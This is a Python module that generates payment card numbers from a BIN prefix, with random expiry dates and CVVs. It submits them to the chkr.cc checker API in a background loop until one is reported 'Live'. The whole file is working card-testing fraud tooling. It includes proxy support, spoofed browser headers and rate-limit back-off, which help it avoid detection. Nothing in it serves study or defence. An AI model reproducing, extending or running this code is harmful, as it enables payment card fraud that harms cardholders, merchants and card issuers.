"""
Card generator and checker — generates cards from BIN and finds Live ones.
Uses chkr.cc API for checking.
"""

import logging
import random
import re
import threading
import time
from typing import Optional, Callable
import requests

logger = logging.getLogger(__name__)


def luhn_checksum(num: str) -> int:
    """Calculate Luhn checksum."""
    total = 0
    reverse_digits = num[::-1]
    for i, d in enumerate(reverse_digits):
        n = int(d)
        if i % 2 == 1:
            n *= 2
            if n > 9:
                n -= 9
        total += n
    return total % 10


def luhn_complete(partial: str) -> str:
    """Complete a partial card number with Luhn check digit."""
    check = luhn_checksum(partial + '0')
    check_digit = 0 if check == 0 else 10 - check
    return partial + str(check_digit)


def generate_card_number(bin_prefix: str) -> str:
    """Generate a valid card number from BIN prefix."""
    prefix = bin_prefix.lower().replace('x', '').replace('X', '')
    
    # Determine card length
    if re.match(r'^3[47]', prefix):
        total_digits = 15
    else:
        total_digits = 16
    
    missing = total_digits - 1 - len(prefix)
    middle = ''.join(str(random.randint(0, 9)) for _ in range(missing))
    return luhn_complete(prefix + middle)


def generate_cvv(bin_prefix: str) -> str:
    """Generate CVV based on card type."""
    is_amex = re.match(r'^3[47]', bin_prefix.lower().replace('x', ''))
    length = 4 if is_amex else 3
    return ''.join(str(random.randint(0, 9)) for _ in range(length))


def check_card(card_data: str, timeout: int = 15, proxy: str | None = None) -> dict:
    """Check card via chkr.cc API."""
    try:
        response = requests.post(
            'https://api.chkr.cc/',
            headers={
                'Content-Type': 'application/json; charset=utf-8',
                'Origin': 'https://chkr.cc',
                'Referer': 'https://chkr.cc/',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36',
            },
            json={'data': card_data, 'charge': False},
            timeout=timeout,
            proxies={"http": proxy, "https": proxy} if proxy else None,
        )
        
        if response.status_code == 429:
            return {'status': 'RateLimited', 'message': 'Too many requests'}
        
        if response.status_code != 200:
            return {'status': 'Error', 'message': f'HTTP {response.status_code}'}
        
        data = response.json()
        return {
            'status': data.get('status', 'Unknown'),
            'message': data.get('message', ''),
            'code': data.get('code', -1),
        }
    except Exception as e:
        logger.error(f"Card check error: {e}")
        return {'status': 'Error', 'message': str(e)}


def generate_card_from_bin(bin_prefix: str, month: Optional[str] = None, year: Optional[str] = None) -> str:
    """Generate a complete card string from BIN."""
    card_number = generate_card_number(bin_prefix)
    card_month = month or f"{random.randint(1, 12):02d}"
    card_year = year or str(random.randint(2025, 2030))
    card_cvv = generate_cvv(bin_prefix)
    return f"{card_number}|{card_month}|{card_year}|{card_cvv}"


class LiveCardFinder:
    """Background card finder — generates and checks cards until Live found."""
    
    def __init__(self, bin_prefix: str, max_attempts: int = 100, proxy: str | None = None):
        self.bin_prefix = bin_prefix
        self.max_attempts = max_attempts
        self.proxy = proxy
        self.live_card: Optional[str] = None
        self.attempts = 0
        self._stop_event = threading.Event()
        self._thread: Optional[threading.Thread] = None
    
    def start(self, callback: Optional[Callable[[str, dict], None]] = None):
        """Start background search."""
        self._thread = threading.Thread(target=self._search, args=(callback,), daemon=True)
        self._thread.start()
        logger.info(f"[LiveCardFinder] Started search for BIN {self.bin_prefix}")
    
    def _search(self, callback: Optional[Callable[[str, dict], None]] = None):
        """Internal search loop."""
        for attempt in range(self.max_attempts):
            if self._stop_event.is_set():
                break
            
            self.attempts = attempt + 1
            card_data = generate_card_from_bin(self.bin_prefix)
            
            logger.debug(f"[LiveCardFinder] Checking card {attempt + 1}/{self.max_attempts}")
            result = check_card(card_data, proxy=self.proxy)
            
            if callback:
                callback(card_data, result)
            
            if result['status'] == 'Live':
                self.live_card = card_data
                logger.info(f"[LiveCardFinder] LIVE card found after {attempt + 1} attempts: {card_data[:6]}...{card_data[-4:]}")
                return
            
            if result['status'] == 'RateLimited':
                logger.warning("[LiveCardFinder] Rate limited, waiting 10s...")
                time.sleep(10)
            else:
                time.sleep(0.5)  # Small delay between checks
        
        logger.warning(f"[LiveCardFinder] No Live card found after {self.max_attempts} attempts")
    
    def stop(self):
        """Stop the search."""
        self._stop_event.set()
    
    def wait(self, timeout: Optional[float] = None) -> Optional[str]:
        """Wait for Live card. Returns None if timeout."""
        if self._thread and self._thread.is_alive():
            self._thread.join(timeout=timeout)
        return self.live_card
    
    def is_running(self) -> bool:
        """Check if search is still running."""
        return self._thread is not None and self._thread.is_alive()


# Global finder instance
_current_finder: Optional[LiveCardFinder] = None


def start_live_card_search(bin_prefix: str, max_attempts: int = 100, 
                           callback: Optional[Callable[[str, dict], None]] = None,
                           proxy: str | None = None) -> LiveCardFinder:
    """Start background search for Live card."""
    global _current_finder
    
    # Stop previous if running
    if _current_finder and _current_finder.is_running():
        _current_finder.stop()
        _current_finder.wait(timeout=2)
    
    _current_finder = LiveCardFinder(bin_prefix, max_attempts, proxy=proxy)
    _current_finder.start(callback)
    return _current_finder


def get_live_card(timeout: float = 60) -> Optional[str]:
    """Get Live card, waiting if necessary."""
    if _current_finder is None:
        return None
    return _current_finder.wait(timeout=timeout)


def get_finder_status() -> dict:
    """Get current finder status."""
    if _current_finder is None:
        return {'running': False, 'attempts': 0, 'live_card': None}
    
    return {
        'running': _current_finder.is_running(),
        'attempts': _current_finder.attempts,
        'live_card': _current_finder.live_card is not None,
    }
